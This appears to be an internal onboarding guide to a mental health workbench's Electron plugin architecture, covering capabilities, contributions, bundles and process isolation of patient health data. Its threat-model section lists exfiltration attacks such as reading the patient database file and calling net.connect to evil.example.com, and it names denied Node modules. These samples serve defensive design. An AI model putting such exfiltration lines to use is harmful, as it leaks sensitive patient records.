# Core concepts: Capability, Bundle, Contribution

> A first-principles tour of the three load-bearing concepts in this codebase.
> If you read one platform document before touching code, read this one.
>
> **Audience:** new team members, or anyone returning to the platform layer after time away.
> **Prereq:** rough familiarity with Electron's three-process model. Nothing else.
> **What you'll get:** a working mental model strong enough to make design decisions, not just follow instructions.

Read this before [feature-development.md](./feature-development.md). That guide is a checklist. This guide is the reason the checklist makes sense.

---

## Table of contents

1. [How to read this guide](#how-to-read-this-guide)
2. [The problem: why these concepts exist at all](#1-the-problem-why-these-concepts-exist-at-all)
3. [Capability — the contract](#2-capability--the-contract)
4. [Contribution — the published entry](#3-contribution--the-published-entry)
5. [Bundle — the unit that wraps both](#4-bundle--the-unit-that-wraps-both)
6. [The full picture: how the three compose](#5-the-full-picture-how-the-three-compose)
7. [VSCode analogy: same shape, different stakes](#6-vscode-analogy-same-shape-different-stakes)
8. [Worked example: "Open patient record" end-to-end](#7-worked-example-open-patient-record-end-to-end)
9. [PHI enforcement: the load-bearing invariant](#8-phi-enforcement-the-load-bearing-invariant)
10. [Common misconceptions](#9-common-misconceptions)
11. [Self-check quiz](#10-self-check-quiz)
12. [Where to go next](#11-where-to-go-next)

---

## How to read this guide

You can read it top-to-bottom (45 minutes). Or jump straight to the worked example (§7) and back-fill the concepts when you hit something you don't follow. Both work.

Code snippets are either lifted directly from this repo or are illustrative pseudocode that will be true after Phase 6. Every illustrative example is marked clearly.

---

## 1. The problem: why these concepts exist at all

Imagine you are writing this app with no platform — just an Electron starter. You write:

```ts
// Renderer code
window.electronAPI.savePatientNote(patientId, text)
```

The preload script exposes `savePatientNote`. The main process implements it. SQLite gets written. Everything works.

A week later, you need to fetch notes:

```ts
window.electronAPI.fetchPatientNotes(patientId)
```

Another preload method. Another main handler. Another month, another fifteen methods. The preload is now 400 lines. Every new feature edits the preload. The preload is the entire trust surface of the app.

Then you decide patient lookup needs to live in a separate process for memory reasons. Every Renderer call site that fetched patients now needs updating, because the preload method must change to accommodate the new transport.

Then you want a third-party clinician to write a custom assessment form. They need to register a new command, surface a new view, validate input. There is no mechanism. The shell hardcodes every command and view. To add anything, the third party must submit a PR to the shell.

Three failure modes have appeared, and they compound:

1. **Preload grows unbounded.** Every feature widens the trust surface. There is no principled stopping point.
2. **Location leaks into call sites.** Moving an implementation between processes is a refactor of every caller.
3. **The shell becomes a registry-by-accident.** New features can only be added by editing shell code. Modularity is impossible.

The three concepts in this guide each solve one of these:

| Failure mode | Concept that solves it |
|---|---|
| Preload grows unbounded | **Capability** — one preload method (`bindCapability`), capabilities multiply behind it |
| Location leaks into call sites | **Capability** — typed proxy hides whether work happens in Main, Host, or Cloud |
| Shell hardcodes features | **Contribution** + **Bundle** — shell iterates contribution slots; bundles fill them |

Hold that table in your head while you read. Every detail below is in service of one of those three.

---

## 2. Capability — the contract

### The intuition

You are at a restaurant. You order **"pad thai"**. You don't order **"go to the third burner, fry rice noodles with eggs, add tamarind paste, serve in eight minutes"**. The menu hides the kitchen.

A capability is a menu item:

- It has a **name** (`local.notes`, `audit.log`).
- It has a **contract** — the operations it supports and what they return (`open(patientId): Promise<Note>`).
- It has a **version** — so the menu can change without breaking diners who memorised the old one.
- It has a **scope** — who is allowed to order it.

It does **not** tell you who cooks it, in which kitchen, with what ingredients. That's the chef's problem.

### The contract in code

A capability shows up in two places. **In the consumer**, as a typed proxy:

```ts
// Renderer code (illustrative — exact API shape evolves through Phase 6+)
const notes = await window.soam.bindCapability('local.notes', '1.0')
const note = await notes.call('open', patientId)
```

**In the implementer**, as a handler registered against a name:

```ts
// Main code — this exists today in electron/main/capability/platform-ping.ts
registerCapability('platform.ping', '1.0', async (method, args) => {
  if (method !== 'ping') {
    throw new Error(`Unknown method: ${method}`)
  }
  const message = typeof args[0] === 'string' ? args[0] : ''
  return { echo: message, pid: process.pid, ts: Date.now() }
})
```

These two sides do not import each other. They only agree on the **name + version + method shape**. The capability registry is the matchmaker.

### What a capability hides

Three things, deliberately:

**1. Process location.** The consumer calls `notes.call('open', ...)`. The work might happen:

- In Main (typical for PHI-touching capabilities — DB lives in Main).
- In Bundle Host (typical for bundle-implemented business logic).
- In the Cloud Backend, brokered through Main (typical for backup, sync).

The consumer cannot tell. It is not told. This is not an accident — it is the entire point.

**2. Transport.** Today: structured-clone over Electron IPC. Tomorrow: maybe Comlink, maybe something else (Open Item O2). The consumer's code does not change when the transport does.

**3. Permission enforcement.** When you call `bindCapability(...)`, the platform may check scope — does this consumer have permission to use this capability? The check happens at bind time, inside the platform, not scattered across every call site. (Permission model itself is deferred — Open Item O4 — but the architecture leaves a place for it.)

### Why this matters

Once consumers stop encoding location, **implementations can move without touching consumers**. That sounds boring until you have shipped the wrong thing.

Real cases this will hit:

- Patient lookup starts in Main. Memory pressure pushes it to a worker process. **Capabilities: zero callers change.** Direct IPC: hundreds of edits.
- Audit log starts as a local SQLite table. It becomes a streaming append to a cloud audit service. **Capabilities: zero callers change.** Direct imports: rewrite every audit emission site.
- A capability gets a new method. Old consumers don't break; the typed contract simply grew.

### What capability is *not*

| It is | It is not |
|---|---|
| A typed async contract | A REST endpoint URL |
| Identified by name + version | Identified by file path or class |
| Resolved through the registry | Resolved by import |
| Always async | Sometimes sync |
| Mostly Main-resident for PHI | Renderer-resident |

> **Self-check:** If you find yourself writing `import { savePatient } from '@platform/main/patients'` in Renderer code, the capability model has not been followed. Step back and ask: what's the capability name? Who owns it?

---

## 3. Contribution — the published entry

### The intuition

A capability lets a bundle **consume** something from the platform. A contribution lets a bundle **publish** something *to* the platform.

They are duals. You almost always need both.

Back to the restaurant: a capability is "you can order pad thai". A contribution is "this chef has added pad thai to the menu board". The dining room (the shell) doesn't know which chef wrote which menu item. It just reads the board and prints menus for diners.

### What can be published

A **contribution point** is a typed slot the platform owns. Bundles register against it. The platform iterates registered entries to do its job.

Illustrative slots (the actual catalogue is platform-team-owned and grows over time — see Open Item O7):

| Contribution point | Bundle registers | Platform consumes for |
|---|---|---|
| `commands` | `{ id, title, handler }` | Command palette, keybindings, menus |
| `views` | `{ id, location, component }` | Mounting iframes in sidebar / panel / editor |
| `settings` | `{ key, type, default, description }` | Settings editor, configuration store |
| `validators` | `{ schema, scope }` | Renderer live-validation **and** authority enforcement (same rule, two sites) |
| `menus` | `{ menu, group, when }` | Building the actual menu structures |
| `keybindings` | `{ key, command, when }` | Keyboard dispatcher |

### What a contribution looks like

This is pseudocode — the registration API form is Open Item O5, and bundle infrastructure lands Phase 6. The shape is illustrative:

```ts
// Inside a bundle's activate() function
ctx.contributions.commands.register({
  id: 'patients.openRecord',
  title: 'Open Patient Record',
  handler: async (patientId: string) => {
    const notes = await ctx.capabilities.bind('local.notes', '1.0')
    return notes.call('open', patientId)
  },
})

ctx.contributions.views.register({
  id: 'patients.sidebar',
  location: 'primarySideBar',
  // For bundle views this is not a React component — it's an entry to a sandboxed iframe
  // hosted via `view://` protocol per ADR-411. Phase 7+.
  view: 'view://patients/sidebar.html',
})
```

The shell knows nothing about `patients`. It iterates `contributions.commands` and shows them all in the palette. It iterates `contributions.views` and mounts each in the location requested. Adding a new bundle means adding new entries to those iterations. **The shell does not change.**

### Why two concepts, not one

You could imagine merging the two: every bundle just registers "things" with the platform, and the platform sorts out what's consumed and what's published.

The reason this is a bad idea: **they have different lifecycles, different ownership, and different trust implications.**

- A **capability** the bundle consumes is owned by someone else. Bind it, use it, release it. If it disappears, you handle the error.
- A **contribution** the bundle publishes is owned by the bundle itself. Register it, the platform indexes it, dispose to remove it. If the *bundle* disappears, the platform cleans up.

Fusing them obscures the direction of trust. ADR-104 calls this out explicitly in "Considered Options" — it was on the table and was rejected.

> **Self-check:** "Should this be a capability or a contribution?" Ask yourself: am I providing behaviour, or am I providing data/entries for the platform to use? Behaviour → capability. Entries → contribution. If a single thing feels like both, you are usually looking at two things glued together.

---

## 4. Bundle — the unit that wraps both

### The intuition

A bundle is the registrable unit. It bundles the capabilities it consumes (its dependencies) with the contributions it publishes (its output). It also has a lifecycle: it activates, it runs, it disposes.

If a capability is a menu item and a contribution is an entry on the menu board, then a **bundle is a chef** — a self-contained unit who:

- Orders ingredients from the kitchen (consumes capabilities).
- Posts dishes on the menu board (publishes contributions).
- Sometimes makes their own dishes available to other chefs (implements capabilities).
- Shows up to work (activates), does the work, goes home cleanly (disposes).

### The three sides of a bundle

```
Bundle
├── Capabilities consumed   ── What I take from the platform
├── Capabilities implemented ── What I provide (often: my own domain logic)
├── Contributions published  ── What I add to the shell's surfaces
└── Lifecycle                ── When I activate; what I dispose on teardown
```

Most bundles do all four. A pure-service bundle that only implements capabilities (no UI) is valid. A pure-view bundle that only publishes views with no capability binding is rare and usually a smell — it means the UI hardcodes its data sources.

### The activation function

A bundle is a Node module that exports one function:

```ts
// Illustrative — Phase 6+
export async function activate(ctx: BundleContext): Promise<Disposable> {
  // 1. Consume the capabilities I need
  const notes = await ctx.capabilities.bind('local.notes', '1.0')
  const audit = await ctx.capabilities.bind('audit.log', '1.0')

  // 2. Implement my own capabilities (optional)
  const patientsCap = ctx.capabilities.implement('patients.lookup', '1.0', {
    findByName: async (name) => { /* runs in Bundle Host */ },
  })

  // 3. Publish contributions
  const cmd = ctx.contributions.commands.register({
    id: 'patients.openRecord',
    title: 'Open Patient Record',
    handler: async (id) => notes.call('open', id),
  })

  // 4. Return one disposable that tears all of this down
  return Disposable.from(notes, audit, patientsCap, cmd)
}
```

The function is async. It may fail. If it does:

- None of its contributions register.
- The platform emits a scoped error.
- Other bundles continue activating.
- The shell does not crash.

That isolation is structural. A bundle author cannot opt out of it.

### Triggers — when does activation run?

A bundle declares one of:

- **`eager`** — activate at platform boot. Reserved for things the shell cannot start without (e.g., the bundle that registers the command palette itself).
- **`lazy`** — activate on first consumer touch (first command invocation, first view mount, first capability call). **Default.**
- **`onEvent`** — activate when a named platform event fires (e.g., opening a document of a specific type).

Lazy is the default for the same reason you don't start every program on your laptop at boot: you'd wait forever and waste memory.

### The disposable contract

Every registration returns a disposable. The bundle aggregates them. On deactivation, the platform calls one `dispose()` and everything the bundle did is unwound.

This is not a lifecycle-only mechanism. The disposable pattern is used everywhere — see [disposable-pattern.md](./disposable-pattern.md) for the full convention. The reason it shows up in the bundle lifecycle is that **a bundle is the biggest unit that uses the pattern**, so it's the most visible application.

### Where does a bundle's code run?

**Bundle business logic runs in the Bundle Host process** — a Node.js `utilityProcess` separate from Main. See ADR-410.

**Bundle UI runs in a sandboxed iframe inside the Renderer** — via the `view://` protocol. See ADR-411. The iframe is not part of the Renderer's React tree; it has its own document, its own JS context, its own CSP. It talks to the bundle's logic via a narrow bridge.

A bundle therefore exists in **two processes simultaneously**:

```
Bundle "patients" (lives in two places at once)
├── Bundle Host (Node):   activate(), capability implementations, business logic
└── Renderer (sandboxed iframes):  one iframe per view, talks to Host via bridge
```

This is identical to VSCode's "extension runs in Extension Host; webviews are sandboxed iframes" model. The two pieces communicate through a narrow bridge defined by the platform, not by direct imports.

> **Self-check:** "Is a bundle one thing or two?" One conceptually — `patients` is "the patients feature". Two processes physically — Host code + sandboxed iframe(s). Both pieces are owned by the same bundle author, but they cannot share memory; they exchange messages.

---

## 5. The full picture: how the three compose

This is the diagram to memorise:

```
┌────────────────────────────────────────────────────────────────────┐
│                                                                    │
│   RENDERER (Chromium, sandboxed)                                   │
│   ┌──────────────────────────┐  ┌──────────────────────────────┐   │
│   │  Workbench shell (React) │  │  Bundle view iframe(s)       │   │
│   │  - reads contributions   │  │  (one per mounted view)      │   │
│   │  - mounts iframes        │  │  - sandboxed, narrow bridge  │   │
│   │  - calls capabilities    │  │  - calls capabilities        │   │
│   └────────────┬─────────────┘  └────────────┬─────────────────┘   │
│                │                              │                    │
│                └───────────┬──────────────────┘                    │
│                            │ window.soam.bindCapability(...)       │
└────────────────────────────┼───────────────────────────────────────┘
                             │ IPC (one channel: soam:call)
                             ▼
┌────────────────────────────────────────────────────────────────────┐
│  MAIN (Node, trusted)                                              │
│                                                                    │
│  ┌──────────────────────────────────────────────────────────────┐  │
│  │  Capability registry                                         │  │
│  │  - 'local.notes@1.0'      → Main handler (PHI; DB here)      │  │
│  │  - 'audit.log@1.0'        → Main handler                     │  │
│  │  - 'patients.lookup@1.0'  → forwards to Bundle Host          │  │
│  └─────────────────┬─────────────────────────────┬──────────────┘  │
│                    │                             │                 │
│  ┌─────────────────▼──────────────┐              │                 │
│  │  Main-resident services        │              │                 │
│  │  - SQLite (Local Store)        │              │                 │
│  │  - KEK / crypto                │              │                 │
│  │  - Audit log                   │              │                 │
│  │  - Brokered networking         │              │                 │
│  └────────────────────────────────┘              │                 │
│                                                  │                 │
│  ┌───────────────────────────────────────────────┘                 │
│  │  Contribution registry (sent to Renderer at boot)               │
│  │  - commands: [...]   views: [...]   settings: [...]   ...       │
│  └─────────────────────────────────────────────────────────────────┘
└────────────────────────────┬───────────────────────────────────────┘
                             │ parentPort messages
                             ▼
┌────────────────────────────────────────────────────────────────────┐
│  BUNDLE HOST (Node utilityProcess, trusted; hardened from Phase 6) │
│                                                                    │
│  ┌──────────────────────────────────────────────────────────────┐  │
│  │  Bundle code                                                 │  │
│  │  - activate() runs here                                      │  │
│  │  - capability implementations bundles own                    │  │
│  │  - business logic                                            │  │
│  │  - NO direct fs/net/child_process (Phase 6 hardening)        │  │
│  └──────────────────────────────────────────────────────────────┘  │
└────────────────────────────────────────────────────────────────────┘
```

### Reading the diagram

- **One channel, one bridge.** The Renderer's entire IPC surface is `window.soam.bindCapability(...)`. Adding capabilities does not add IPC channels.
- **Main is the only matchmaker.** Capability calls always go through Main. Renderer never talks to Host directly. Renderer doesn't even know Host exists.
- **PHI lives in Main.** The DB is here. The KEK is here. Capabilities that touch PHI are implemented in Main, not delegated to Host. Bundle Host gets PHI only when a Main capability hands it over.
- **Contributions flow the other way.** Main reads bundle manifests at boot, pushes the contribution registry to Renderer once. Renderer reads from it forever after. (Re-push on bundle enable/disable.)
- **Bundles span two processes.** Logic in Host, views in Renderer iframes. Same author. Different memory. They talk through bridges.

### The four communication paths

| From | To | Through | Example |
|---|---|---|---|
| Renderer | Main | `window.soam.bindCapability` → IPC | Renderer calls `local.notes.open(id)` |
| Renderer | Bundle Host | Main brokers | Same call, if the capability is Host-implemented |
| Bundle Host | Main | parentPort message → registry | Bundle calls `audit.log.emit(...)` |
| Bundle Host | Renderer (view) | Via the `view://` bridge | Bundle pushes data to its own iframe |

No other communication exists. No direct Renderer → Host. No Renderer → DB. No Host → SQLite file. Each is impossible by construction, not by convention.

---

## 6. VSCode analogy: same shape, different stakes

If you know VSCode extensions, the mapping is nearly one-to-one:

| VSCode | This platform | Notes |
|---|---|---|
| Extension | Bundle | Same role, same lifecycle |
| Extension Host (Node) | Bundle Host (`utilityProcess`) | Same process model |
| `vscode.*` API | `ctx.capabilities.bind(...)` | Typed contract per capability vs. one monolithic API |
| `contributes.commands` in `package.json` | Contributions registry | Same idea, mechanism deferred (O5) |
| Webview | Sandboxed iframe + `view://` protocol | Stricter sandbox here |
| Activation events (`onCommand`, `onLanguage`) | Bundle triggers (`eager`/`lazy`/`onEvent`) | Same shape |
| `activate()` returns subscriptions | `activate()` returns `Disposable` | Same idea, one verb |

So at a high level: **bundles are VSCode extensions.** That's the right mental shortcut.

### What's different and why

Three differences matter:

**1. No marketplace, no third-party (yet).** All bundles today are first-party. The capability/contribution machinery is in place so that opening to third parties later does not require a retrofit. But until then, simplify your mental model: every bundle author is trusted.

**2. PHI enforcement at the capability boundary.** This is the load-bearing security difference and gets its own section (§8). The short version: a VSCode extension can do `fs.readFileSync('/path/to/anything')`. A bundle here cannot. The Bundle Host is hardened — no `fs`, no `net`, no `child_process` by default. The only path to data is through capabilities, and Main owns the gate.

**3. Sandboxed iframes, not `WebContentsView`.** VSCode webviews can opt into looser sandboxes. Bundle views here are sandboxed iframes with no Node integration, no `contextIsolation: false` escape hatch. The bridge surface is narrow and platform-defined.

### Why the analogy is useful

If you've ever written a VSCode extension, you already know:

- Why activation is lazy by default.
- Why you accumulate disposables and return one aggregate.
- Why your code talks to an API, not to internals.
- Why your webview cannot just `require('electron')`.

All of that translates. You are not learning a new model; you are learning a stricter version of one you know.

### Why the analogy is dangerous

If you've ever written a VSCode extension, you also have habits:

- Reading files directly. **No: capability.**
- Spawning child processes. **No: capability.**
- Importing siblings' internals (a bad VSCode habit too). **No: shared logic moves down into a capability.**
- Surfacing privileged APIs to webviews. **No: the bridge is narrow.**

If something feels natural in VSCode and doesn't have an obvious capability mapping here, that's the moment to stop and ask the platform team. Don't reach for the escape hatch. There is no escape hatch.

---

## 7. Worked example: "Open patient record" end-to-end

We'll trace a single user action through the system. Read this slowly.

### The setup

The platform team has, at some point before today:

- Defined a `local.notes@1.0` capability with method `open(patientId): Promise<Note>`.
- Implemented it in Main — handler queries SQLite, decrypts with KEK, returns the note.

The patients bundle author has, in their bundle's `activate()`:

- Bound `local.notes@1.0`.
- Registered a command contribution: `{ id: 'patients.openRecord', title: 'Open Patient Record', handler: (id) => notes.call('open', id) }`.
- Registered a view contribution for the patient detail iframe.
- Returned a disposable aggregating all of it.

The user is sitting in the workbench, looking at the command palette.

### The trace

**1. User opens command palette (`Ctrl+Shift+P`) and types "open patient".**

The Renderer shell iterates its in-memory contribution registry. It finds `patients.openRecord` with title "Open Patient Record". Fuzzy match scores it high. It renders in the palette.

The shell has no idea this command came from the patients bundle. It just reads from `contributions.commands`.

**2. User selects the command.**

The shell invokes the contribution's handler. The handler is a function the bundle registered. It runs in the Bundle Host process (because the bundle's `activate()` ran there).

Wait. How does the Renderer "invoke" a function that lives in Host? It doesn't directly. The shell's command invocation goes through a `commands.run(id, args)` capability that the platform provides. That capability routes to the bundle that owns the command, which is in Host.

**3. Bundle Host: command handler executes.**

```ts
async (id) => notes.call('open', id)
```

`notes` is a capability proxy bound during `activate()`. `.call('open', id)` is an outbound capability call from Host back through Main.

**4. Main: capability registry resolves `local.notes@1.0`.**

This capability is **Main-implemented**, not Host-implemented. The handler is a Main-resident function. It runs in Main, not in Host.

```ts
// In Main
async (method, args) => {
  if (workspaceLocked()) throw new Error('KEK locked')
  await audit.log({ event: 'phi.read', capability: 'local.notes', method: 'open' })
  const ciphertext = await db.query('SELECT body FROM notes WHERE patient_id = ?', args)
  return decrypt(ciphertext, kek)
}
```

The KEK check, the audit emission, the DB query, the decryption — all in Main. Bundle Host never touches the DB. Bundle Host never sees the KEK.

**5. Main returns the decrypted note to Host.**

Structured-clone serialisation over `parentPort`. Host's `notes.call('open', id)` promise resolves.

**6. Bundle Host receives the note and pushes it to its view.**

The bundle has a view iframe mounted in the editor area. It sends the note over the view bridge:

```ts
view.postMessage({ type: 'note-loaded', note })
```

**7. Renderer iframe: receives the note, renders it.**

The iframe's React tree updates. The clinician sees the note.

### What just happened, in concept terms

- A **contribution** (the command) was discovered by the shell from its registry.
- The contribution's handler was a function inside a **bundle**.
- The handler **consumed** a capability (`local.notes`).
- The capability's implementation lived in Main, not in the bundle, because it touches PHI.
- The result flowed back through the bundle to a sandboxed iframe that is part of the same bundle's UI.

### What did not happen

- The Renderer never imported a Main-side module.
- The bundle never read the SQLite file directly.
- The shell never knew the patients bundle existed.
- The DB was not touched by anything except the Main-resident capability handler.
- PHI never reached a place it shouldn't be (Renderer can render it on screen; nothing persists it there).

This is the whole system working as designed.

---

## 8. PHI enforcement: the load-bearing invariant

ADR-301 says: PHI never reaches the cloud in plaintext, **enforced structurally**. "Structurally" means: not by a warning dialog the user can dismiss, not by a code review the engineer can forget, but by the architecture itself. The wrong thing must be physically impossible.

This is the most important thing the capability boundary does. Everything else in this guide could be a productivity feature. This one is the reason the platform exists in its current shape.

### The threat model

You are writing a bundle. Suppose you turn malicious — or, more likely, suppose a dependency you didn't audit turns malicious. What can the bundle do?

| Attack | If we used VSCode-style extensions | Here |
|---|---|---|
| `fs.readFileSync('/path/to/patient-db.sqlite')` | Possible. PHI exfiltrated. | `fs` blocked in Bundle Host. Impossible. |
| `net.connect('evil.example.com')` | Possible. PHI exfiltrated. | `net` blocked. All outbound traffic through a `net.brokered.fetch` capability Main controls. |
| Encode PHI as DNS lookups | Possible (creative `fs` -> `os` -> resolver chain). | DNS path closed; no system APIs reachable from Host. |
| Read PHI while workspace is locked | N/A — no concept of locked workspace. | Capability handler refuses (`workspaceLocked()` returns true). Bundle has no fallback path to data. |
| Skip the audit log | Possible — extension can choose. | Audit emission is **in the capability handler**, not in the caller. Cannot be skipped. |
| Stash decrypted PHI in IndexedDB and exfiltrate later | Possible in Renderer code. | Renderer never owns persistence; only Main does. Renderer can see PHI to render it, cannot persist it. |

### How the architecture enforces each of these

**1. Bundle Host has no Node powers by default.** From Phase 6, the Host process runs bundle code with `fs`, `net`, `child_process`, `os.networkInterfaces`, etc. either deleted from globals or behind a module-level deny. The bundle physically cannot call them.

**2. Every PHI capability is Main-implemented.** The handler that decrypts and returns data is a function in Main's address space. The bundle calls the capability; the bundle does not implement it. There is no shared-memory shortcut — the only way PHI reaches the bundle is when Main hands it over as a structured-clone IPC payload.

**3. Audit is in the handler, not the caller.** The handler emits the audit log before returning data. There is no version of the call that returns PHI without emitting audit. The bundle cannot choose otherwise.

**4. Lock state is checked in the handler.** Same principle — the workspace's locked/unlocked check is in the Main-resident handler. A bundle that calls the capability while locked gets an error, not data.

**5. Renderer is the least trusted zone.** It can hold PHI in transient state to render it on screen. It cannot persist it. The IndexedDB / localStorage paths are not exposed through capabilities; only Main owns persistent storage. This is enforced by ADR-302 (Local Store in Main) and the trust hierarchy.

### One thing the architecture does *not* enforce yet

**Crash dumps may contain PHI in memory.** ADR-303 Open Item O28: a Node process crash dump can contain anything that was in memory, including decrypted PHI. Scrubbing crash dumps before they leave the device is required and not yet implemented.

This is called out so you don't read "PHI never leaks" and assume the work is done. It's structurally enforced for the *normal* paths. Crash-time scrubbing is its own piece of work.

### Why this is the difference that matters

VSCode's extension model is excellent for an editor. If your worst case is "a malicious extension reads your source code", you accept it because the productivity payoff is enormous and the data sensitivity is low.

A mental health workbench has different worst cases. "A malicious extension reads patient records" is unacceptable. The same shape of model — bundles, capabilities, contributions — has to enforce stricter invariants. That's the work the architecture does. That's what you, as a bundle author, are operating inside.

> **Self-check:** When you design a new bundle, ask: "If this bundle's dependencies became malicious tomorrow, what's the worst they could do?" If the answer is anything more than "make my own bundle's UX broken", you've found a leak in the model. Tell the platform team.

---

## 9. Common misconceptions

These are the dead-ends people actually hit. Each is followed by the correction and a one-line "how to remember".

### "A bundle is a service."

No. A **service** (ADR-103 terminology) is an implementation of one or more capabilities. A **bundle** (ADR-104 terminology) is a registration unit that may *contain* services, but also consumes capabilities, publishes contributions, has a lifecycle, may have a UI.

> A service implements one contract. A bundle is a project.

### "A bundle is a VSCode extension with extra steps."

Close but misleading. The mechanism is the same; the stakes are different. The "extra steps" are the PHI enforcement, the narrow sandbox, the explicit capability boundary. They are not bureaucracy; they are the reason this architecture exists.

> Same shape. Stricter sandbox. Real reason.

### "Capability handlers always live in the bundle that registered the capability."

No. A capability handler lives wherever its **implementation** is. PHI-touching handlers live in Main. Bundle-domain handlers (e.g., `patients.lookup`) typically live in Bundle Host. Some handlers might one day be brokered to the Cloud Backend (still entered through Main).

> Capability name → registry → handler. Where the handler runs is the registry's call, not the caller's concern.

### "The DB query for `local.notes.open` runs in the Bundle Host."

No. PHI capabilities are Main-implemented. The DB lives in Main. The Bundle Host gets PHI only when Main hands it over after the access checks.

> If it touches PHI, Main owns it. If it's bundle logic, Host owns it.

### "Bundle code can talk to the Renderer directly."

No. Bundle code in Host talks to its own iframe(s) in Renderer through the view bridge — that's the **only** Host → Renderer path, and it's narrow. Bundle code cannot reach into the workbench shell's React tree. It cannot read other bundles' iframes. It cannot post arbitrary messages to the Renderer.

> Host talks to its own views. Nothing else.

### "Adding a feature means adding a new preload method."

No. Preload is frozen at one method (`bindCapability`) plus a narrow events channel. Adding a feature means adding a **capability**, possibly a **contribution**, often wrapped in a **bundle**. The preload does not grow.

> The preload is a door, not a hallway. New things go behind the door.

### "If I want shared logic across two bundles, I just import from one into the other."

No. Cross-bundle imports are forbidden. Shared logic moves down into a capability owned by a service. Both bundles bind to the capability. This is the same rule that prevents "extension A reaches into extension B's internals" failures in VSCode.

> Shared logic is always down, never sideways.

### "Renderer-side validation is enough — the UI will check inputs before submitting."

No. Renderer-side validation is for convenience UX (live feedback). Authority-side validation is for enforcement (the only one that matters for correctness). Both must read from the **same rule**, declared once as a `validators` contribution. Renderer-only validation is theatre — easy to bypass and easy to drift from the authority.

> Convenience validation in Renderer. Enforcement validation at the authority. Same rule, both sites.

### "Contributions are pulled by the shell on demand."

No. Main reads bundle manifests at boot, pushes the contribution registry to the Renderer once. Renderer reads from its in-memory copy. The push happens again when bundles enable/disable. There is no on-demand pull.

> One push at boot. Pulls are for capability calls, not contributions.

### "Bundle Host is just a sandbox."

It is sandboxed, but it is also a **trusted** zone. Bundle Host > Renderer in the trust ranking, because Bundle Host runs Node code that the platform team has at least minimally vetted (today: first-party; tomorrow: signed/reviewed). Renderer runs sandboxed Chromium content with the assumption that any DOM event might be hostile. Don't conflate "sandboxed from Main" with "untrusted".

> Trust ranking: Main > Bundle Host > Renderer.

---

## 10. Self-check quiz

Try these before reading the answers. The point is not to be right, but to notice where the model is fuzzy in your head so you can re-read those sections.

### Questions

1. The Renderer wants to fetch a list of patients. Where does the DB query run? Which process holds the decrypted result first?
2. A bundle wants to add a "Generate session summary" command to the command palette. Which abstraction does this need: capability, contribution, both, or neither?
3. A bundle wants to call an external transcription service over HTTPS to process audio. The audio recording contains PHI. What's the architecturally correct path?
4. A bundle's `activate()` throws on line 3. What happens to (a) that bundle, (b) other bundles, (c) the shell, (d) any contributions it registered on lines 1 and 2?
5. You are writing a bundle. You want shared utility code in a sibling module. You also want to call code from another bundle. Which is fine, which is forbidden, and what's the correct path for the forbidden one?
6. The Renderer reads `notes.call('open', 'patient-123')` and gets back the decrypted note text. The user then closes the workspace. Where does the note text need to be deleted from, and where is it the architecture's job versus the renderer's job?
7. Why is "add a new method to the `window.soam` preload" the wrong answer when a feature needs something new?
8. A bundle implements `patients.lookup@1.0` (a Host-resident capability) and also consumes `local.notes@1.0` (a Main-resident capability). Trace what runs where when a Renderer calls `patients.lookup.findByName('Smith')` and the implementation needs to read three notes.

### Answers

**1.** The DB query runs in **Main**. SQLite lives in Main per ADR-302. The decrypted result first exists in **Main's memory** (after the handler decrypts it), then crosses IPC to whoever called the capability — typically Bundle Host (if the caller is a bundle) or Renderer (if the caller is the shell). Bundle Host can hold PHI in memory; Renderer can hold it transiently to render but cannot persist it.

**2.** Both. The command itself is a **contribution** (the bundle publishes an entry into `contributions.commands`). The command's handler will probably **consume a capability** to do its work (e.g., `local.sessions.generateSummary`). Most bundles operate this way: contributions wire UI to capability calls.

**3.** Through a **brokered networking capability** (ADR-203). The bundle binds something like `net.brokered.fetch` (or a transcription-specific brokered capability) and calls it. Main performs the actual HTTPS call. Credentials (if any) are injected by Main from the keychain (ADR-304). The bundle never sees raw network access. Direct `fetch('https://...')` from the bundle is **forbidden** for anything PHI-adjacent, and forbidden by the architecture for anything Host-resident anyway (no `net` in Host).

**4.** (a) The failed bundle has none of its contributions registered — the platform rolls back. (b) Other bundles are unaffected; their activations continue. (c) The shell does not crash; it emits a scoped error for the failed bundle and keeps running. (d) Contributions registered on lines 1 and 2 are unwound by the platform — the bundle author does not need to write rollback code, but does need to design `activate()` so partial state isn't observable elsewhere. (ADR-105 §"Failure isolation".)

**5.** Sibling-module utility code within your own bundle: **fine**. Calling code from another bundle: **forbidden**. The correct path: identify the shared logic, push it down into a **capability** owned by a service (or a new service), then both bundles bind to that capability. Cross-bundle imports are the failure mode ADR-104 exists to prevent.

**6.** The note text is the **architecture's job** to remove from Main's caches and Bundle Host's memory at workspace close — that's part of the workspace lifecycle reset (ADR-403, plus Open Item O98 on the reset matrix). The **renderer's job** is to drop its transient view state (React state, query cache entries) when the workspace closes. The renderer must not have persistent storage of PHI to begin with, so "deletion from renderer persistence" is a non-problem by design.

**7.** Because every new preload method widens the trust surface and creates a string-typed API that's not version-tracked, location-agnostic, or scope-checked. The capability model gives all those properties for free. New behaviour goes behind the existing `bindCapability` door, as a new capability — not as a new door. (ADR-202 commits the preload to this shape.)

**8.** The trace:

   - Renderer calls `patients.lookup.findByName('Smith')` via `window.soam.bindCapability` → IPC → Main.
   - Main's registry sees `patients.lookup@1.0` is **Host-implemented**. Main forwards the call to Bundle Host via `parentPort`.
   - Bundle Host runs the handler. The handler needs three notes, so it calls `local.notes.open(id)` three times via its capability proxy.
   - Each call goes from Host → Main via `parentPort`. Main sees `local.notes@1.0` is **Main-implemented**. The handler runs in Main — KEK check, DB query, decrypt, audit emit, return.
   - Each note flows back Host. The Host handler composes the result and returns.
   - Main forwards the final result to the Renderer.

   Five process hops total. The Renderer made one capability call; the architecture handled the rest.

---

## 11. Where to go next

**To consolidate the concepts:**

- [ADR-103](../ADRs/103-capability-based-service-model.md) — capability/service model (the formal decision).
- [ADR-104](../ADRs/104-contribution-model.md) — contribution model and the bundle unit.
- [ADR-105](../ADRs/105-bundle-activation-lifecycle.md) — activation, disposal, failure isolation.

**To see how the trust zones are wired:**

- [ADR-101](../ADRs/101-three-authority-zones.md) — Main / Renderer / Cloud Backend.
- [ADR-410](../ADRs/410-bundle-host-process-model.md) — the fourth zone, where bundle logic runs.
- [ADR-411](../ADRs/411-view-hosting-for-bundles.md) — how bundle UIs render in sandboxed iframes.

**To see PHI enforcement in full:**

- [ADR-301](../ADRs/301-phi-boundary-architectural-not-ux.md) — the first principle.
- [ADR-302](../ADRs/302-local-first-data-model.md) — where data lives.
